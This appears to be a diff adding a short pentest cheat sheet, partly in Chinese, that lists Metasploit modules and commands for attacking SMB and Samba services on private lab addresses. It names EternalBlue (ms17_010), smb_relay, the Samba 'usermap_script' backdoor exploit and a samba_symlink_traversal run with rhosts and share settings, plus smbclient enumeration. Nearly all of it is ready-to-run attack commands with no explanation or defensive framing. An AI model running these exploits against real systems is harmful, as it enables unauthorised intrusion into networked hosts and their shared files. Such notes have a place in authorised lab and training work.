@@ -1,0 +1,17 @@
+windows/smb/ms17_010_eternalblue
+
+windows/smb/smb_relay
+访问kali:\\192.168.2.11\gx\
+
+samba后门漏洞:
+Samba smbd 3.X
+smbclient -L //192.168.2.129
+use auxiliary/admin/smb/samba_symlink_traversal 
+set rhosts 192.168.2.4
+set smbshare tmp
+run
+smbclient  //192.168.2.4/tmp
+
+ Samba缓冲区溢出
+ use multi/samba/usermap_script
+ 
